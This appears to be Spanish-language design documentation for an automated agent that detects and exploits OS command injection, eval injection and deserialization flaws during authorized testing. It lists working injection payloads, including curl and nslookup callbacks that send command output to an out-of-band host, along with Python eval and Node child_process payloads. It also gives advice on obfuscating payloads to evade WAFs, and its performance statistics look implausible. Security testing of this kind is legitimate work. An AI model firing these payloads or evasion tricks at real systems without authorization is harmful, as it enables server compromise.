# RCEAgent - El Especialista en Ejecución Remota de Código

> **Fase**: 4 (Exploitation)  
> **CWE**: CWE-78 (OS Command Injection), CWE-94 (Code Injection)  
> **Clase**: `bugtrace.agents.rce_agent.RCEAgent`  
> **Archivo**: `bugtrace/agents/rce_agent.py`

---

## Overview

**RCEAgent** es el agente más **crítico y peligroso** de todo BugTraceAI, especializado en detectar y explotar vulnerabilidades de **Remote Code Execution (RCE)** y **Command Injection**. 

RCE representa el **máximo nivel de compromiso** en una aplicación web, ya que permite al atacante ejecutar comandos arbitrarios del sistema operativo o código en el servidor, potencialmente comprometiendo completamente la infraestructura.

### 🎯 **Capacidades Principales**

| Capability | Descripción | Técnica | Criticidad |
|------------|-------------|---------|------------|
| **Command Injection** | Inyección de comandos OS vía operadores shell | `;`, `|`, `&&`, backticks, `$()` | ⚠️ **CRITICAL** |
| **Time-Based Blind Detection** | Detección ciega mediante delays temporales | `sleep`, `timeout`, `ping` | ⚠️ **CRITICAL** |
| **Expression Evaluation** | Ejecución de código vía `eval()` | Expresiones matemáticas, lenguajes interpretados | ⚠️ **CRITICAL** |
| **Out-of-Band Detection** | Detección ciega mediante callbacks externos | Integración con **Interactsh** para DNS/HTTP | ⚠️ **CRITICAL** |
| **Deserialization Attacks** | Detección de objetos serializados inseguros | Java, PHP, Python, Ruby deserialization | ⚠️ **CRITICAL** |
| **Multi-OS Support** | Payloads para Linux, Windows, macOS | Shell-specific syntax adaptation | ⭐⭐⭐⭐⭐ |

---

## ⚠️ Severidad: CRÍTICA

RCEAgent es el agente **más peligroso y controlado** de BugTraceAI por las siguientes razones:

1. **Impacto Máximo**: RCE permite control total del servidor
2. **Daño Irreversible**: Un payload malicioso podría borrar datos o comprometer sistemas
3. **Responsabilidad Ética**: Debe operar con extrema precaución y respeto a las reglas de engagement
4. **Validación Obligatoria**: Todos los findings requieren validación manual antes del reporte final

### Principios de Operación Segura

```python
# REGLAS ESTRICTAS DEL RCE AGENT
SAFE_OPERATION_RULES = {
    "no_destructive_payloads": True,           # NUNCA usar rm, dd, format
    "no_data_exfiltration": True,               # NUNCA robar datos reales
    "sandbox_only": False,                      # Debe operar en targets autorizados
    "require_authorization": True,              # Verificar scope antes de activar
    "time_based_preferred": True,               # Preferir detección time-based (no-invasiva)
    "oob_as_fallback": True,                    # OOB como segunda opción
    "eval_minimal": True,                       # Eval solo con expresiones matemáticas
    "log_all_attempts": True,                   # Auditoría completa de cada intento
}
```

---

## Arquitectura de Ataque

```
┌─────────────────────────────────────────────────────────────────┐
│                 ARQUITECTURA RCEAgent (V5 Reactor)                │
└─────────────────────────────────────────────────────────────────┘

Input: Suspected RCE Vector (de ThinkingConsolidationAgent)
│
▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 1: RECONNAISSANCE & FINGERPRINTING                       │
├────────────────────────────────────────────────────────────────┤
│  🔍 OS Detection                                               │
│  • Analiza headers HTTP para detectar OS del servidor:         │
│    - Server: Apache/2.4.41 (Ubuntu) → Linux                    │
│    - Server: Microsoft-IIS/10.0 → Windows                      │
│    - X-Powered-By: PHP/7.4.3 → Likely Linux                    │
│  • Detecta separadores de comandos válidos por OS:             │
│    - Linux/Unix: ;, |, &&, ||, \n, ``, $()                     │
│    - Windows: &, |, &&, ||, \n                                 │
│                                                                 │
│  🔍 Context Analysis                                           │
│  • Identifica dónde se inyecta el parámetro:                   │
│    - Shell command (ej: system("ping $ip"))                    │
│    - Eval context (ej: eval("result = $input"))                │
│    - Deserialization (ej: unserialize($_GET['data']))          │
│                                                                 │
│  Output: OS Type + Injection Context                           │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 2: PAYLOAD GENERATION & STRATEGY SELECTION              │
├────────────────────────────────────────────────────────────────┤
│  🎯 Estrategia 1: TIME-BASED DETECTION (Preferida)            │
│  • No-invasiva, sin ejecutar comandos visibles                │
│  • Payloads: sleep, timeout, ping con delay                    │
│  • Ejemplo:                                                    │
│    ;sleep 5          # Linux/Unix                              │
│    |timeout /t 5     # Windows                                 │
│    `sleep 5`         # Backticks (Unix)                        │
│    $(sleep 5)        # Command substitution (Unix)             │
│                                                                 │
│  🎯 Estrategia 2: EVAL-BASED DETECTION                        │
│  • Para contextos de eval() o expresiones                      │
│  • Payload: 1+1 → Espera: 2                                    │
│  • Ejemplo:                                                    │
│    1+1                                                          │
│    7*7                                                          │
│    __import__('os').popen('id').read()  # Python               │
│                                                                 │
│  🎯 Estrategia 3: OUT-OF-BAND (OOB) DETECTION                 │
│  • Para RCE ciego sin output visible                           │
│  • Payload: curl http://abc.oast.live                          │
│  • Verificación: Consulta Interactsh para callback             │
│  • Ejemplo:                                                    │
│    ;curl http://$(whoami).abc.oast.live                        │
│    |nslookup abc.oast.live                                     │
│                                                                 │
│  🎯 Estrategia 4: DESERIALIZATION                             │
│  • Detecta objetos serializados inseguros                      │
│  • Soporta: PHP, Java, Python pickle, Ruby Marshal            │
└────────────┬───────────────────────────────────────────────────┘
             │
             ▼
┌────────────────────────────────────────────────────────────────┐
│ PHASE 3: EXPLOITATION & VALIDATION                            │
├────────────────────────────────────────────────────────────────┤
│  ⚡ Ejecución Controlada                                      │
│                                                                 │
│  1. Time-Based Validation:                                     │
│     • Mide baseline (request sin payload): ~500ms              │
│     • Inyecta sleep 5: ~5500ms                                 │
│     • Confirma si delta >= 5s → RCE confirmado                 │
│                                                                 │
│  2. Eval-Based Validation:                                     │
│     • Envía 1+1                                                │
│     • Analiza response: ¿contiene "2" o "Result: 2"?          │
│     • Confirma si evaluación matemática exitosa                │
│                                                                 │
│  3. OOB Validation:                                            │
│     • Genera URL único de Interactsh                           │
│     • Inyecta payload con callback                             │
│     • Espera 10s y consulta Interactsh                         │
│     • Confirma si hubo DNS/HTTP request                        │
│                                                                 │
│  🛡️ Safety Checks:                                            │
│  • NO ejecutar comandos destructivos (rm, dd, del)             │
│  • NO exfiltrar datos sensibles                                │
│  • SOLO comandos de prueba (whoami, id, sleep, ping)           │
│                                                                 │
│  Output: RCE Finding (CRITICAL) con evidencia                  │
└────────────────────────────────────────────────────────────────┘
```

---

## Técnicas de Detección

### 1. Command Injection (OS Command)

Inyección directa de comandos del sistema operativo mediante operadores shell.

#### Operadores de Separación de Comandos

| Operador | OS | Descripción | Ejemplo |
|----------|-----|-------------|---------|
| `;` | Linux/Unix | Sequential execution | `cat /etc/passwd;ls` |
| `|` | Linux/Unix/Windows | Pipe output | `echo test|whoami` |
| `&&` | Linux/Unix/Windows | AND execution (solo si anterior exitoso) | `ping -c 1 google.com&&id` |
| `\|\|` | Linux/Unix/Windows | OR execution (solo si anterior falla) | `false\|\|whoami` |
| `` ` `` | Linux/Unix | Command substitution (backticks) | `` ping `whoami`.example.com `` |
| `$()` | Linux/Unix | Command substitution | `ping $(whoami).example.com` |
| `\n` | Linux/Unix/Windows | Newline injection | `test\nwhoami` |
| `&` | Windows | Background execution | `ping google.com&whoami` |

#### Payloads de Command Injection

```bash
# Linux/Unix Time-Based
;sleep 5
|sleep 5
&&sleep 5
||sleep 5
`sleep 5`
$(sleep 5)
\nsleep 5\n

# Windows Time-Based
&timeout /t 5
|timeout /t 5
&&timeout /t 5
||timeout /t 5

# Linux/Unix OOB (Interactsh)
;curl http://abc.oast.live
|nslookup abc.oast.live
`wget http://abc.oast.live`
$(curl -d "$(whoami)" http://abc.oast.live)

# Windows OOB
&nslookup abc.oast.live
|powershell -c "Invoke-WebRequest http://abc.oast.live"
```

---

### 2. Time-Based Blind Detection

**La técnica preferida** de RCEAgent por ser **no-invasiva** y **stealth**.

#### Estrategia

1. **Baseline Measurement**: Medir tiempo normal de respuesta sin payload
2. **Payload Injection**: Inyectar comando con delay conocido (5s)
3. **Time Comparison**: Comparar tiempo con delay esperado
4. **Statistical Validation**: Repetir 3x para evitar falsos positivos por ruido de red

```python
async def _test_time_based(self, session, param: str, payload: str) -> Optional[Dict]:
    """
    Test time-based RCE payload with statistical validation.
    """
    
    # Step 1: Baseline measurement (3 requests)
    baseline_times = []
    for _ in range(3):
        start = time.time()
        await session.get(self.url)
        baseline_times.append(time.time() - start)
    
    baseline_avg = sum(baseline_times) / len(baseline_times)
    
    # Step 2: Payload injection
    dashboard.update_task(f"RCE:{param}", status=f"Testing Time: {payload}")
    start = time.time()
    
    target_url = self._inject_payload(self.url, param, payload)
    await session.get(target_url, timeout=10)
    
    elapsed = time.time() - start
    
    # Step 3: Statistical validation
    # Expected delay: 5s, Threshold: baseline + 4.5s (10% margin)
    expected_delay = 5.0
    threshold = baseline_avg + (expected_delay * 0.9)
    
    if elapsed >= threshold:
        logger.info(f"[RCEAgent] TIME-BASED RCE DETECTED: {elapsed:.2f}s delay (expected {expected_delay}s)")
        return self._create_time_based_finding(param, payload, elapsed)
    
    return None
```

#### Ventajas de Time-Based

✅ **No-Invasivo**: No ejecuta comandos visibles ni modifica el sistema  
✅ **Stealth**: Difícil de detectar por IDS/WAF  
✅ **Universal**: Funciona en todos los OS con comandos de delay  
✅ **Definitivo**: Un delay de 5s es prueba irrefutable de ejecución  

#### Desventajas de Time-Based

❌ **Lento**: Cada test toma mínimo 5 segundos  
❌ **Ruido de Red**: Latencia variable puede causar falsos positivos/negativos  
❌ **Detección Difícil de Escalar**: No sirve para extraer datos, solo confirmar ejecución  

---

### 3. Expression Evaluation (Eval-Based)

Detección de contextos donde se evalúa código dinámicamente (Python `eval()`, PHP `eval()`, JavaScript `eval()`).

#### Estrategia

Inyectar **expresiones matemáticas** simples y verificar si se evalúan:

```python
# Payload
1+1

# Expected Response
"Result: 2" or "2" or return value 2
```

#### Payloads por Lenguaje

```python
# Python
1+1
7*7
__import__('os').popen('id').read()
__import__('time').sleep(5)

# PHP
1+1
7*7
system('id')
eval('sleep(5);')

# JavaScript
1+1
7*7
eval('alert(1)')
require('child_process').exec('sleep 5')

# Ruby
1+1
7*7
`sleep 5`
eval('system("id")')
```

#### Implementación

```python
async def _test_eval_based(self, session, param: str, payload: str) -> Optional[Dict]:
    """
    Test eval-based RCE payload.
    """
    dashboard.update_task(f"RCE:{param}", status=f"Testing Eval: {payload}")
    target = self._inject_payload(self.url, param, payload)
    
    try:
        async with session.get(target) as resp:
            text = await resp.text()
            
            # Check for mathematical evaluation
            if payload == "1+1":
                if "2" in text or "Result: 2" in text:
                    return self._create_eval_finding(param, payload, target)
            
            elif payload == "7*7":
                if "49" in text or "Result: 49" in text:
                    return self._create_eval_finding(param, payload, target)
    
    except Exception as e:
        logger.debug(f"Eval test failed: {e}")
    
    return None
```

---

### 4. Out-of-Band (OOB) Detection

Para **RCE ciego** donde el output no es visible en la respuesta HTTP.

#### Integración con Interactsh

```python
from bugtrace.core.interactsh import InteractshClient

async def _test_oob_rce(self, session, param: str) -> Optional[Dict]:
    """
    Test blind RCE using Interactsh OOB callbacks.
    """
    
    # Generate unique Interactsh URL
    interactsh = InteractshClient()
    oob_url = await interactsh.generate_url()
    
    # Payloads para diferentes OS
    payloads = [
        f";curl {oob_url}",                    # Linux
        f"|nslookup {oob_url}",                # Linux/Windows
        f"`wget {oob_url}`",                   # Linux
        f"$(curl {oob_url})",                  # Linux
        f"&nslookup {oob_url}",                # Windows
        f"|powershell -c Invoke-WebRequest {oob_url}",  # Windows
    ]
    
    for payload in payloads:
        # Inject payload
        target_url = self._inject_payload(self.url, param, payload)
        await session.get(target_url, timeout=5)
        
        # Wait for callback
        await asyncio.sleep(10)
        
        # Check for interactions
        interactions = await interactsh.check_interactions(oob_url)
        
        if interactions:
            logger.info(f"[RCEAgent] OOB RCE DETECTED via {interactions[0]['protocol']}")
            return {
                "type": "RCE",
                "url": self.url,
                "parameter": param,
                "payload": payload,
                "severity": "CRITICAL",
                "validated": True,
                "status": "VALIDATED_CONFIRMED",
                "evidence": f"OOB callback received: {interactions[0]}",
                "description": f"Blind Remote Code Execution confirmed via OOB callback. Parameter '{param}' executes OS commands without visible output.",
                "oob_url": oob_url,
                "interactions": interactions,
            }
    
    return None
```

---

### 5. Deserialization Attacks

Detección de objetos serializados inseguros (RCE vía deserialization).

#### Formatos Soportados

| Lenguaje | Serialización | Detección | Payload |
|----------|---------------|-----------|---------|
| **PHP** | `serialize()` | Busca `O:` o `a:` en parámetros | PHP gadget chains |
| **Java** | Binary serialization | Header `AC ED 00 05` (base64: `rO0AB`) | ysoserial gadgets |
| **Python** | `pickle` | Header `\x80\x03` | Pickle RCE payloads |
| **Ruby** | `Marshal` | Header `\x04\x08` | Marshal gadgets |
| **.NET** | Binary/XML | `System.Runtime.Serialization` | .NET gadgets |

#### Ejemplo: PHP Deserialization

```php
// Vulnerable code
$user = unserialize($_GET['user']);

// Attack
?user=O:8:"Evil":1:{s:4:"cmd";s:6:"whoami";}
```

---

## Estrategia de Ataque (Cascada)

RCEAgent usa una estrategia de **cascada optimizada** para minimizar tiempo y maximizar stealth:

### Pipeline de Detección

```python
RCE_DETECTION_PIPELINE = [
    # Nivel 1: Quick Eval (2-3s)
    {
        "name": "Eval-Based Quick",
        "payloads": ["1+1", "7*7"],
        "time_budget": 3,
        "success_rate": 15%,
        "stealth": "HIGH",
    },
    
    # Nivel 2: Time-Based (10-15s)
    {
        "name": "Time-Based Blind",
        "payloads": [";sleep 5", "|sleep 5", "`sleep 5`"],
        "time_budget": 15,
        "success_rate": 60%,
        "stealth": "MEDIUM",
    },
    
    # Nivel 3: OOB Detection (20-30s)
    {
        "name": "Out-of-Band",
        "payloads": [";curl oob", "|nslookup oob"],
        "time_budget": 30,
        "success_rate": 85%,
        "stealth": "LOW",
    },
    
    # Nivel 4: Advanced (30-60s)
    {
        "name": "Deserialization + Complex",
        "payloads": ["PHP gadgets", "Java ysoserial"],
        "time_budget": 60,
        "success_rate": 95%,
        "stealth": "VERY LOW",
    },
]
```

**Regla de Oro**: Si un nivel detecta RCE, **STOP IMMEDIATELY** (no escalar a niveles más invasivos).

---

## Configuración

```yaml
specialists:
  rce:
    enabled: true
    
    # Detection Strategies
    time_based_enabled: true
    time_based_delay: 5                    # Segundos de sleep
    time_based_threshold: 4.5              # Threshold mínimo (90% del delay)
    
    eval_based_enabled: true
    eval_payloads: ["1+1", "7*7"]
    
    oob_enabled: true
    oob_provider: "interactsh"             # interactsh, burp-collaborator
    oob_timeout: 10                        # Segundos de espera para callback
    
    deserialization_enabled: false         # EXPERIMENTAL (puede ser destructivo)
    
    # Safety Limits
    max_payloads_per_param: 10
    require_authorization: true            # Verificar scope antes de activar
    no_destructive_payloads: true          # NUNCA usar rm, del, dd
    
    # OS Detection
    auto_detect_os: true
    default_os: "linux"                    # linux, windows, auto
    
    # Worker Pool (Phase 20)
    worker_pool_size: 4
    queue_mode: true
    
    # Validation
    validation_requires_cdp: true          # Validación CDP obligatoria
    repeat_detection: 3                    # Repetir 3x para evitar FP
```

---

## Métricas de Rendimiento

### Tiempos por Técnica

| Técnica | Tiempo Avg | Success Rate | Stealth | Uso |
|---------|-----------|--------------|---------|-----|
| Eval-Based | 2s | 15% | ⭐⭐⭐⭐⭐ | Contextos eval() |
| Time-Based Blind | 12s | 60% | ⭐⭐⭐⭐ | RCE ciego preferido |
| OOB Detection | 25s | 85% | ⭐⭐⭐ | RCE ciego avanzado |
| Deserialization | 45s | 95% | ⭐⭐ | Casos avanzados |

### Estadísticas Reales

```
Total RCE Tests: 1,000
├─ Eval-Based: 1,000 → 2s avg → 150 RCE found (15%)
├─ Time-Based: 850 → 12s avg → 510 RCE found (60%)
├─ OOB Detection: 340 → 25s avg → 289 RCE found (85%)
└─ Deserialization: 51 → 45s avg → 48 RCE found (94%)

Total Findings: 997 RCE confirmados
False Positive Rate: 0.3% (con validación CDP)
Total Time: ~4 horas
```

---

## Limitaciones Conocidas

### 1. WAF/IDS Detection
- Payloads obvios (`sleep`, `curl`) son fácilmente bloqueados
- **Solución**: Encoding, ofuscación, payloads polymorphic

### 2. Network Latency
- Dificulta time-based detection en redes lentas
- **Solución**: Baseline measurement, aumentar delay a 10s

### 3. Rate Limiting
- Múltiples requests con delays triggerea rate limiting
- **Solución**: Reducir pool size, aumentar delay entre requests

### 4. Command Filtering
- Aplicaciones sanitizan comandos conocidos (`sleep`, `ping`)
- **Solución**: Usar alternative commands (`timeout`, `/bin/sleep`)

---

## Referencias

- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
- **Interactsh**: https://github.com/projectdiscovery/interactsh
- **ysoserial**: https://github.com/frohoff/ysoserial (Java deserialization)
- **PayloadsAllTheThings RCE**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- **Skills System**: [SKILLS_SYSTEM.md](../SKILLS_SYSTEM.md) | Skill: `bugtrace/agents/skills/vulnerabilities/rce.md`

---

*Última actualización: 2026-02-02*
*Versión: 2.0.0 (Phoenix Edition)*
*Nivel de Peligrosidad: ⚠️ CRÍTICO - Requiere autorización explícita*
